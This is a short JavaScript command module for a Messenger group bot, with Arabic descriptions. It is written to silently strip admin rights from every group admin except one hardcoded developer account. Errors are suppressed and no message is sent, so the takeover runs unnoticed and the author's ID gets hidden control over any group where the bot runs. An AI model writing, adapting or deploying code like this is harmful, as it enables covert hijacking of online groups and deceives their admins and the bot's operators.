module.exports = {
  config: {
    name: "زل",
    aliases: ["zel", "zal"],
    version: "1.1",
    author: "سايم",
    countDown: 5,
    role: 2,
    shortDescription: "صامت: يزيل كل ادمن الغروب ماعدا المطور",
    longDescription: "تنفيذ صامت — يزيل كل ادمن الغروب ماعدا المطور بدون أي رسالة",
    category: "admin",
    guide: "{p}{n}",
  },

  onStart: async function ({ api, event }) {
    const developerID = "61583835186508";

    if (event.senderID !== developerID) return;

    try {
      const threadInfo = await api.getThreadInfo(event.threadID);
      const adminIDs = (threadInfo.adminIDs || []).map(a => (typeof a === "object" ? a.id : a));
      const toRemove = adminIDs.filter(id => id !== developerID);

      for (const id of toRemove) {
        try {
          await api.changeAdminStatus(event.threadID, id, false);
          await new Promise(r => setTimeout(r, 500));
        } catch (_) {}
      }
    } catch (_) {}
  },
};
